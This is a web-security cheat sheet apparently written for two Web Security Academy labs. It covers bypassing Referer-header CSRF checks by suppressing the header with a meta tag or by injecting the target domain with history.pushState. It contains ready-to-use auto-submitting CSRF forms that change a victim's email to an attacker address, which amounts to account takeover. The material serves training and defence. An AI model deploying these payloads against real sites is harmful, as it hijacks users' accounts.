# CSRF - Referer-based bypass

Some apps validate the Referer header as a CSRF defense. Two bypasses: the validation only triggers when the header is present (suppress it with `<meta name="referrer">`), or the check only verifies the target domain appears somewhere in the Referer value (inject the target domain as a URL parameter using `history.pushState`).

## Quick reference
```html
<!-- Bypass 1: suppress Referer with referrer policy meta tag -->
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://LAB/my-account/change-email">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>

<!-- Bypass 2: inject target domain into Referer via history.pushState -->
<script>history.pushState('','','/?YOUR-LAB-ID.web-security-academy.net')</script>
<form method="POST" action="https://LAB/my-account/change-email">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

## Root cause
- **Bypass 1:** Server conditionally validates - `if (isset($_SERVER['HTTP_REFERER'])) { check... }` - so absent Referer skips the check entirely.
- **Bypass 2:** Server does substring match: `if (strpos($referer, 'legitimate-site.com') !== false)` - attacker can satisfy this by making the attacker URL contain the target domain in its path/query.

## Find it
1. Submit the change-email form normally; capture POST.
2. Delete `Referer` header -> if accepted -> "depends on header being present".
3. Modify Referer to `https://attacker.com` -> if rejected -> Referer is validated.
4. Append target domain as query param: `Referer: https://attacker.com?TARGET-DOMAIN` -> if accepted -> broken substring check.

## Technique
**Absent Referer accepted:**
1. Confirm POST /my-account/change-email checks Referer when present.
2. In Burp Repeater: delete Referer header -> 302 redirect to success -> accepted.
3. PoC: add `<meta name="referrer" content="no-referrer">` to suppress Referer in victim's browser.
4. No Referer -> no check -> CSRF succeeds.

**Broken substring check:**
1. Confirm arbitrary Referer rejected; modified Referer with target domain anywhere -> accepted.
2. In PoC: `history.pushState` changes the URL shown in Referer to include the lab domain as a query param.
3. `history.pushState('','','/?YOUR-LAB-ID.web-security-academy.net')` -> the page URL becomes `https://exploit-server.net/?YOUR-LAB-ID.web-security-academy.net` -> Referer sent with form submission will contain both the exploit server origin AND the target domain.
4. Server sees target domain in Referer -> validates -> CSRF succeeds.

Note: Some browsers strip query params from Referer (Referer Policy). If Referrer-Policy: `strict-origin` is set by the target, it may strip the query. Check that Referrer-Policy isn't overriding. May need to set `Referrer-Policy: unsafe-url` in PoC page's response headers - not directly possible from HTML, but can request exploit server to serve with that header.

## Payload arsenal
```html
<!-- Bypass 1: no-referrer meta tag -->
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://LAB/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>

<!-- Bypass 2: pushState to add target domain into Referer -->
<script>history.pushState('','','/?YOUR-LAB-ID.web-security-academy.net')</script>
<form method="POST" action="https://LAB/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

## Bypasses
| Defense | Bypass |
|---|---|
| Referer must match target domain | Suppress Referer with `<meta name="referrer" content="no-referrer">` if check is conditional |
| Substring match on domain | `history.pushState` makes Referer URL contain target domain as query param |
| Strict Referer required | Combine with server-side header injection if available |

## Exploitation walkthrough
**Absent Referer (Lab 1):** In Repeater, delete Referer -> accepted. Add `<meta name="referrer" content="no-referrer">` to PoC HTML before the form. Host on exploit server, deliver -> victim's browser sends POST with no Referer -> check skipped -> email changed.

**Broken substring (Lab 2):**
1. Test: `Referer: https://attacker.com?YOUR-LAB-ID` -> accepted.
2. `history.pushState('','','/?YOUR-LAB-ID.web-security-academy.net')` sets page URL -> Referer on next request = `https://exploit-server.net/?YOUR-LAB-ID.web-security-academy.net`.
3. Auto-submit form after pushState -> Referer contains target domain -> validation passes.

## Chaining
- Same impact as other CSRF bypasses: account takeover via email change.
- Referer bypass + [XSS](../../XSS/) = can also steal Referer-based session tokens.

## Tools
- **Burp Repeater** - delete/modify Referer header to test both bypasses
- **Exploit server** - host PoC (can set response headers)

## Labs

### CSRF where Referer validation depends on header being present [Practitioner]
Delete Referer header in Repeater -> accepted. PoC: `<meta name="referrer" content="no-referrer">` suppresses Referer. Key insight: conditional validation = no validation if header is absent.

### CSRF with broken Referer validation [Practitioner]
Server checks if target domain appears anywhere in Referer. `history.pushState('','','/?YOUR-LAB-ID.web-security-academy.net')` -> Referer becomes attacker URL with target domain in query param -> substring check passes. Key insight: `contains()` check on Referer is easily bypassed by appending the expected string.

## Real-world notes
- Referer-based CSRF defense is weak by design - the Referer header can be suppressed by the browser via meta tags, noreferrer links, or Referrer-Policy headers.
- `history.pushState` is a reliable way to control the Referer value without a server-side response header.
- Modern CSRF defenses use unpredictable per-session tokens or SameSite cookies - Referer checks should be considered a supplementary control, never a primary one.

## References
- https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses
